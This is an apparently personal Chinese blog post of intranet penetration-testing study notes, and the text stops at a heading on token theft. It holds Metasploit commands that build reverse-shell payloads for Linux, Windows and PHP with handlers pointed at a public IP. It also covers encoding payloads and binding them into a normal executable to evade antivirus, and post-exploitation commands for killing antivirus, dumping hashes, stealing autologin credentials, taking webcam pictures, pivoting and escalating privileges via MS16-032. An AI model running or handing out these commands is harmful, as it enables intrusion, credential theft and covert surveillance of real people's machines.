<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>内网学习记录 | GabgM</title><meta name="keywords" content="内网"><meta name="author" content="GabgM"><meta name="copyright" content="GabgM"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="以下是在学习内网渗透过程中记录的一些笔记，不是特别详细，但是基本的一些工具使用都记录。本文未记录具体的工作原理等。仅限于学习交流。 msfmsf具有五个模块： Auxiliaries（辅助）、Exploit（漏洞利用）、Payload（攻击载荷）、Post（后期渗透）及Encoders（编码工具） 基本使用步骤： 扫描目标，寻找可利用漏洞-&gt; 选择漏洞利用模块 -&gt; 选择攻击载荷模块">
<meta property="og:type" content="article">
<meta property="og:title" content="内网学习记录">
<meta property="og:url" content="https://gabgm.com/2022/05/06/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="GabgM">
<meta property="og:description" content="以下是在学习内网渗透过程中记录的一些笔记，不是特别详细，但是基本的一些工具使用都记录。本文未记录具体的工作原理等。仅限于学习交流。 msfmsf具有五个模块： Auxiliaries（辅助）、Exploit（漏洞利用）、Payload（攻击载荷）、Post（后期渗透）及Encoders（编码工具） 基本使用步骤： 扫描目标，寻找可利用漏洞-&gt; 选择漏洞利用模块 -&gt; 选择攻击载荷模块">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
<meta property="article:published_time" content="2022-05-06T09:53:23.000Z">
<meta property="article:modified_time" content="2022-05-12T09:10:11.021Z">
<meta property="article:author" content="GabgM">
<meta property="article:tag" content="内网">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://gabgm.com/2022/05/06/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?36b1767202cb4c1c1679b1d0441ed281";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '内网学习记录',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-12 17:10:11'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><meta name="generator" content="Hexo 5.4.2"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://avatars.githubusercontent.com/u/36436374?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-tags"></i><span> 标签</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/web/"><i class="fa-fw fas fa-tags"></i><span> Web</span></a></li><li><a class="site-page child" href="/tags/%E5%86%85%E7%BD%91/"><i class="fa-fw fas fa-tags"></i><span> 内网</span></a></li><li><a class="site-page child" href="/tags/%E5%B7%A5%E5%85%B7/"><i class="fa-fw fas fa-tags"></i><span> 工具</span></a></li><li><a class="site-page child" href="/tags/python/"><i class="fa-fw fas fa-tags"></i><span> Python</span></a></li><li><a class="site-page child" href="/tags/json/"><i class="fa-fw fas fa-tags"></i><span> Json</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">GabgM</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-tags"></i><span> 标签</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tags/web/"><i class="fa-fw fas fa-tags"></i><span> Web</span></a></li><li><a class="site-page child" href="/tags/%E5%86%85%E7%BD%91/"><i class="fa-fw fas fa-tags"></i><span> 内网</span></a></li><li><a class="site-page child" href="/tags/%E5%B7%A5%E5%85%B7/"><i class="fa-fw fas fa-tags"></i><span> 工具</span></a></li><li><a class="site-page child" href="/tags/python/"><i class="fa-fw fas fa-tags"></i><span> Python</span></a></li><li><a class="site-page child" href="/tags/json/"><i class="fa-fw fas fa-tags"></i><span> Json</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">内网学习记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-05-06T09:53:23.000Z" title="发表于 2022-05-06 17:53:23">2022-05-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-05-12T09:10:11.021Z" title="更新于 2022-05-12 17:10:11">2022-05-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91/">内网</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">27.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>110分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/05/06/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#post-comment"><span class="gitalk-comment-count"></span></a></span></div></div></div><article class="post-content" id="article-container"><p>以下是在学习内网渗透过程中记录的一些笔记，不是特别详细，但是基本的一些工具使用都记录。本文未记录具体的工作原理等。仅限于学习交流。</p>
<h1 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h1><p>msf具有五个模块： Auxiliaries（辅助）、Exploit（漏洞利用）、Payload（攻击载荷）、Post（后期渗透）及Encoders（编码工具）</p>
<p>基本使用步骤：</p>
<p>扫描目标，寻找可利用漏洞-&gt; 选择漏洞利用模块 -&gt; 选择攻击载荷模块 -&gt; 选择编码技术，进行免杀-&gt; 渗透攻击 </p>
<p>msf中可使用nmap进行扫描   如：namp -O -Pn 192.168.1.1  不使用ping的方式，扫描目标的操作系统信息</p>
<p>msf是纯内存工作，并且使用加密通信，并且会寄存在被攻击进程内工作。</p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>Linux</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">生成shell文件</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">168</span> LPORT=<span class="number">3306</span> -f elf &gt; payload.elf</span><br><span class="line"></span><br><span class="line">进入msf：</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">104</span>.<span class="number">160</span>.<span class="number">41</span>.<span class="number">30</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">3306</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">客户端：</span><br><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>

<p>Windows  -exe文件</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">生成shell文件</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">247</span>.<span class="number">130</span> LPORT=<span class="number">4444</span> -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">104</span>.<span class="number">160</span>.<span class="number">41</span>.<span class="number">30</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">3306</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">运行payload.exe文件</span><br></pre></td></tr></table></figure>

<p>PHP文件</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">生成shell文件</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">104</span>.<span class="number">160</span>.<span class="number">41</span>.<span class="number">30</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">3306</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">访问shell.php文件即可</span><br></pre></td></tr></table></figure>

<p>无文件落地反弹</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery </span><br><span class="line">/*可使用show options查看脚本语言，使用 <span class="built_in">set</span> target <span class="number">2</span>切换语言*/</span><br><span class="line">//设置payload</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">104</span>.<span class="number">160</span>.<span class="number">41</span>.<span class="number">30</span></span><br><span class="line">exploit</span><br><span class="line">//随后会生成一段脚本，在目标机器中执行即可反弹shell</span><br></pre></td></tr></table></figure>

<p>加密payload</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 查看所有payloads</span><br><span class="line">show payloads</span><br><span class="line"># 查看windows可用（输完按两下回车）</span><br><span class="line">use payload/windows/</span><br><span class="line"># 使用绑定端口payload</span><br><span class="line">msf5 &gt; use payload/windows/shell_bind_tcp</span><br><span class="line"># 查看payload编码，里面可能含有“坏字符”</span><br><span class="line">msf5 payload(windows/shell_bind_tcp) &gt; generate</span><br><span class="line"># 对坏字符编码（默认自动选择一个最合适的encoder，也可以手动指定encoder）</span><br><span class="line">msf5 payload(windows/shell_bind_tcp) &gt; generate -b &#x27;\x00\x0a\x0d&#x27;</span><br><span class="line"># 查看encoders</span><br><span class="line">msf5 payload(windows/shell_bind_tcp) &gt; show encoders</span><br><span class="line"># 指定某一个encoder</span><br><span class="line">msf5 payload(windows/shell_bind_tcp) &gt; generate -e x86/fnstenv_mov</span><br><span class="line"># 将payload加密<span class="number">5</span>次（-i）生成exe格式（-t）并与正常的exe程序绑定（-x），生成到指定目录（-f）</span><br><span class="line">msf5 payload(windows/shell_bind_tcp) &gt; generate -b &#x27;\x00\x0a\x0d&#x27; -t exe -i <span class="number">5</span> -k -x /root/Desktop/normal.exe -f /root/Desktop/normal_add_payload.exe</span><br><span class="line"># 当目标主机运行带payload的程序后，目标主机<span class="number">4444</span>端口将会被开放，此时就可以使用nc直接获取目标主机shell</span><br><span class="line">nc <span class="number">192</span>.<span class="number">168</span>.<span class="number">172</span>.<span class="number">133</span> <span class="number">4444</span></span><br><span class="line"></span><br><span class="line"># 给ShellCode前面加Nop（当EIP寄存器指向Nop时，会无操作并向下执行，一直执行到ShellCode为止）</span><br><span class="line">msf5 payload(windows/shell_bind_tcp) &gt; generate -n <span class="number">14</span></span><br><span class="line"># 生成不同语言的payload，默认为Ruby。（如生成c语言payload）</span><br><span class="line">msf5 payload(windows/shell_bind_tcp) &gt; generate -f c</span><br></pre></td></tr></table></figure>

<p>shell_reverse_tcp</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">show payloads</span><br><span class="line">use windows/shell_reverse_TCP</span><br><span class="line">info</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">4444</span></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">generate -f aspx 生成aspx版本的shellcode</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">4444</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>





<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>search portscan 搜索可用的端口扫描工具 （如果搜索漏洞利用模块，结果中的rank标记为excellent&lt;杰出的&gt;,表示利用成功率较高的一种，优先使用）</p>
<p>unset  取消某个参数的设置</p>
<p>setg  对某个参数进行全局设置</p>
<p>unsetg   取消某个参数的全局设置</p>
<p>getpid  查看msf shell的进程号</p>
<p>run post/windows/manage/migrate 自动迁移msf shell到其他进程</p>
<p>migrate 448  迁移msf shell到448进程中 </p>
<p>sysinfo  查看系统信息</p>
<p>run post/windows/gather/checkvm  查看目标是否为虚拟机</p>
<p>idletime  查看目标机运行时间</p>
<p>route 查看目标机网络设置</p>
<p>background 将当前会话放置到后台</p>
<p>getuid  查看当前会话的用户名</p>
<p>run post/windows/manage/killav  关闭目标机系统杀毒软件</p>
<p>run post/windows/manage/enable_rdp  启动目标机远程桌面</p>
<p>run post/windows/manage/autoroute  查看目标机本地子网情况</p>
<p>run post/windows/gather/enum_applications   查看当前运行的app应用程序</p>
<p>run post/windows/gather/enum_logged_on_users   查看当前登录用户信息</p>
<p>route add ip 掩码 session编号  添加路由表到会话中</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">例：</span><br><span class="line">meterpreter &gt; run post/windows/manage/autoroute </span><br><span class="line">xxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">xxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">Route added to subnet <span class="number">192</span>.<span class="number">168</span>.<span class="number">172</span>.<span class="number">0</span>/<span class="number">255</span>.<span class="number">255</span>.<span class="number">255</span>.<span class="number">0</span> from host&#x27;s routing table.</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">msf exploit(handler) &gt; route add <span class="number">192</span>.<span class="number">168</span>.<span class="number">172</span>.<span class="number">0</span> <span class="number">255</span>.<span class="number">255</span>.<span class="number">255</span>.<span class="number">0</span> <span class="number">1</span></span><br><span class="line"> 之后就可以借助被控主机对网络进行攻击</span><br><span class="line"> </span><br><span class="line"> 或者：</span><br><span class="line"> meterpreter &gt; run get_local_subnets #查看目标机子网</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: <span class="number">192</span>.<span class="number">168</span>.<span class="number">160</span>.<span class="number">0</span>/<span class="number">255</span>.<span class="number">255</span>.<span class="number">255</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">160</span>.<span class="number">0</span>/<span class="number">24</span>  #添加路由</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]                     [*] Adding a route to <span class="number">192</span>.<span class="number">168</span>.<span class="number">160</span>.<span class="number">0</span>/<span class="number">255</span>.<span class="number">255</span>.<span class="number">255</span>.<span class="number">0</span>...</span><br><span class="line">[+] Added route to <span class="number">192</span>.<span class="number">168</span>.<span class="number">160</span>.<span class="number">0</span>/<span class="number">255</span>.<span class="number">255</span>.<span class="number">255</span>.<span class="number">0</span> via <span class="number">192</span>.<span class="number">168</span>.<span class="number">160</span>.<span class="number">132</span>                   [*] Use the -p option to list all active routes</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run autoroute -p #查看路由是否添加成功                </span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.              [!] Example: run post/multi/manage/autoroute OPTION=value [...]                    Active Routing Table                             </span><br><span class="line">====================                                                                  Subnet             Netmask            Gateway</span><br><span class="line">------             -------            -------</span><br><span class="line"><span class="number">192</span>.<span class="number">168</span>.<span class="number">160</span>.<span class="number">0</span>      <span class="number">255</span>.<span class="number">255</span>.<span class="number">255</span>.<span class="number">0</span>      Session <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>run post/windows/gather/enum_logged_on_users 列举主机当前有多少用户登陆</p>
<p>run post/windows/gather/enum_applications 列举主机的应用程序</p>
<p>run windows/gather/credentials/windows_autologin   抓取自动登陆的用户名和密码</p>
<p>load espia 加载Espia插件</p>
<p>screengrab 抓取屏幕截图  screenshot也可以</p>
<p>webcam_list  查看主机是否有摄像头</p>
<p>webcam_snap  打开目标主机摄像头，并拍照</p>
<p>webcam_stream  打开目标主机摄像头，进行视频。可以打开生成的html文件，进行在线观看</p>
<p>shell  进入目标机的cmd shell中  exit退出</p>
<p>pwd  查看当前目录路径</p>
<p>getlwd  查看当前处于本地的哪个目录（不是受害机）</p>
<p>ps  查看所有进程</p>
<p>ls cd 都一样</p>
<p>search -f *.txt -d c:\  搜索C盘中所有的txt文件    -f 表示搜索文件模式   -d表示在哪个目录下搜索</p>
<p>download c:\test.txt /root   下载目标机上的test.txt的文件到本地root目录</p>
<p>upload /root/test.txt c:\  上传本地test.txt文件到目标机的c盘</p>
<p>seach cve-2017-7494          　　　　　　　　#查看是否存在指定漏洞</p>
<p>use exploit/multi/handler         　　　　　　　　#使用exploit/multi/handler模块</p>
<p>info                         　　　　　　　　 #查看信息</p>
<p>show options　　　　　　　　　　　　　　　　　 #查看exp的参数 rhost 是远程主机地址 lhost是本地主机地址</p>
<p>back                        　　　　　　　　#返回上一级</p>
<p>session -i                     　　　　　　　　#查看当前可用会话</p>
<p>sessions -i x                   　　　　　　　　#切换至会话x</p>
<p>session -k                    　　　　　　　　#杀死所有活跃会话</p>
<p>background                   　　　　　　　　#将会话放到后台</p>
<p>route　　　　　　　　　　　　　　　　　　　　　#查看被控主机路由表</p>
<p>sysinfo 　　　　　　　　　　　  　　　　　　　　#查看系统信息</p>
<p>run post/windows/gather/checkvm 　　　　　　　　#检查是否在虚拟机上运行</p>
<p>idletime　　　　　　　　　　　　　　　　　　　　#查看运行时间</p>
<p>getuid                  　　　　　　　　　　　#获得运行Meterpreter会话的用户名，从而查看当前会话具有的权限</p>
<p>getsystem                　　　　　　　　　　 #通过各种攻击向量来提升到系统用户权限</p>
<p>getwd pwd                　　　　　　　　　  #shell处于靶机的目录</p>
<p>getlwd                  　　　　 　　　　　　  #本地的目录位置</p>
<p>hashdump               　　　　　　　　　　  #导出目标主机中的口令哈希值</p>
<p>screenshot               　　　　　　　　　 #对目标主机的屏幕进行截图</p>
<p>backgroud               　　　　　　　　　　 #将当前Meterpreter shell转为后台执行</p>
<p>quit                     　　　　　　　　　 #关闭当前Meterpreter会话，返回MSF终端   </p>
<p>ps                      　　　　　　　　　   #显示所有运行进程以及管联的用户账户</p>
<p>migrate PID               　　　　　　　　　#迁移到一个指定的进程PID</p>
<p>post/windows/manage/migrate                  #会自动寻找合适的进程进行迁移</p>
<p>execute -f cmd.exe -i       　　　　　　　　　　#执行cmd.exe命令并进行交互</p>
<p>shell                     　 　　　　　　　  #以所有可用令牌来运行一个交互的shell</p>
<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>shell  进入cmd命令行执行 whoami /groups查看当前权限</p>
<p>Mandatory Label\Medium Mandatory Level  为标准权限</p>
<p>Mandatory Label\High Mandatory Level   为管理员权限</p>
<p>getsystem 自动提权</p>
<p>systeminfo 查看系统信息，查看补丁情况，使用未打补丁的提权漏洞进行提权</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">常见提权漏洞</span><br><span class="line">KiTrap0D   KB979682</span><br><span class="line">MS11-<span class="number">011</span>   KB2393802</span><br><span class="line">MS11-<span class="number">080</span>   KB2592799</span><br><span class="line">MS16-<span class="number">032</span>   KB3139914</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>Windows2003</th>
<th>Windows2008</th>
<th>Windows2012</th>
</tr>
</thead>
<tbody><tr>
<td>KB2360937   MS10-084</td>
<td>KB3139914   MS16-032</td>
<td>KB3139914   MS16-032</td>
</tr>
<tr>
<td>KB2478960   MS11-014</td>
<td>KB3124280   MS16-016</td>
<td>KB3124280   MS16-016</td>
</tr>
<tr>
<td>KB2507938   MS11-056</td>
<td>KB3134228   MS16-014</td>
<td>KB3134228   MS16-014</td>
</tr>
<tr>
<td>KB2566454   MS11-062</td>
<td>KB3079904   MS15-097</td>
<td>KB3079904   MS15-097</td>
</tr>
<tr>
<td>KB2646524   MS12-003</td>
<td>KB3077657   MS15-077</td>
<td>KB3077657   MS15-077</td>
</tr>
<tr>
<td>KB2645640   MS12-009</td>
<td>KB3045171   MS15-051</td>
<td>KB3045171   MS15-051</td>
</tr>
<tr>
<td>KB2641653   MS12-018</td>
<td>KB3000061   MS14-058</td>
<td>KB3000061   MS14-058</td>
</tr>
<tr>
<td>KB944653     MS07-067</td>
<td>KB2829361   MS13-046</td>
<td>KB2829361   MS13-046</td>
</tr>
<tr>
<td>KB2850851   MS13-053 <br />EPATHOBJ 0day 限32位</td>
<td>KB2850851   MS13-053 <br />EPATHOBJ 0day 限32位</td>
<td>KB2850851   MS13-053 <br />EPATHOBJ 0day 限32位</td>
</tr>
<tr>
<td>KB2707511   MS12-042 sysretpid</td>
<td>KB2707511   MS12-042 sysretpid</td>
<td>KB2707511   MS12-042 sysretpid</td>
</tr>
<tr>
<td>KB2124261/KB2271195  MS10-065  IIS7</td>
<td>KB2124261/KB2271195  MS10-065  IIS7</td>
<td>KB2124261/KB2271195  MS10-065  IIS7</td>
</tr>
<tr>
<td>KB970483/KB09-020   IIS6</td>
<td>KB970483/KB09-020   IIS6</td>
<td>KB970483/KB09-020   IIS6</td>
</tr>
<tr>
<td>KB942831     MS08-005</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB2503665   MS11-046</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB2592799   MS11-080</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB956572     MS09-01  巴西烤肉</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB2621440   MS12-020</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB977165     MS10-015  Ms Viru</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB3139914   MS16-032</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB3124280   MS16-016</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB3134228   MS16-014</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB3079904   MS15-097</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB3077657   MS15-077</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB3045171   MS15-051</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB3000061   MS14-058</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB2829361   MS13-046</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB952004     MS09-012 PR</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB2620712   MS11-097</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB2393802   MS11-011</td>
<td></td>
<td></td>
</tr>
<tr>
<td>KB971657     MS09-041</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>提权实例：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">search ms16_032</span><br><span class="line">use windows/local/ms16_032_secondary_logon_handle_privesc</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>令牌窃取：</p>
